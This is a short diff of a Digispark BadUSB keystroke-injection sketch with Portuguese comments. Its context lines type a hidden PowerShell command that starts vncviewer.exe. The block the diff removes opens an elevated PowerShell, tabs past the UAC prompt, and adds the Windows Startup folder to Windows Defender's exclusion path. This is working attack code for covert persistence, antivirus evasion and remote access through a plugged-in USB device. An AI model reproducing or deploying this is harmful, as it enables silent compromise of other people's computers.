@@ -58,21 +58,6 @@ pisca_led(100);
   DigiKeyboard.println("powershell -windowstyle hidden start ./vncviewer.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    //Adicionando o arquivo nas exclusões do Windows Defender
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell start-process powershell -verb runas");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t\t");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden Set-MpPreference -ExclusionPath 'c:/ProgramData/microsoft/windows/start menu/programs/startup'");
-  DigiKeyboard.delay(1000);
   //
  pisca_led(1000); 
   for(;;){ /*empty*/ } 
